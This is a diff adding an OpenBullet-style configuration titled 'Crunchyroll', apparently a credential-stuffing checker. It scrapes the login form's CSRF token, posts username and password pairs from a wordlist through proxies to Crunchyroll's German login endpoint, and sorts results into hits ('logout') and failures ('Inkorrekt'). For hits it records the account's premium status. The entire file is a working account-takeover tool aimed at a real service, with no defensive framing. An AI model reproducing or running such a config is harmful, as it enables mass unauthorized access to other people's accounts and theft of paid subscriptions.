@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-07T10:13:17.1584983+00:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.crunchyroll.com/de/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.crunchyroll.com" 
+  HEADER "Origin: https://www.crunchyroll.com" 
+  HEADER "Referer: https://www.crunchyroll.com/de/login?next=%2Fde" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+PARSE "<SOURCE>" LR "login_form[_token]\" value=\"" "\" /></form>" -> VAR "TOKEN" 
+REQUEST POST "https://www.crunchyroll.com/de/login" 
+  CONTENT "login_form%5Bname%5D=<USER>&login_form%5Bpassword%5D=<PASS>&login_form%5Bredirect_url%5D=%2Fde&login_form%5B_token%5D=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: www.crunchyroll.com" 
+  HEADER "Origin: https://www.crunchyroll.com" 
+  HEADER "Referer: https://www.crunchyroll.com/de/login?next=%2Fde" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "logout" 
+  KEYCHAIN Failure OR 
+    KEY "Inkorrekt" 
+PARSE "<SOURCE>" LR "premium_status\":\"" "\",\"" -> CAP "Premium Status" 
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"free\"" 
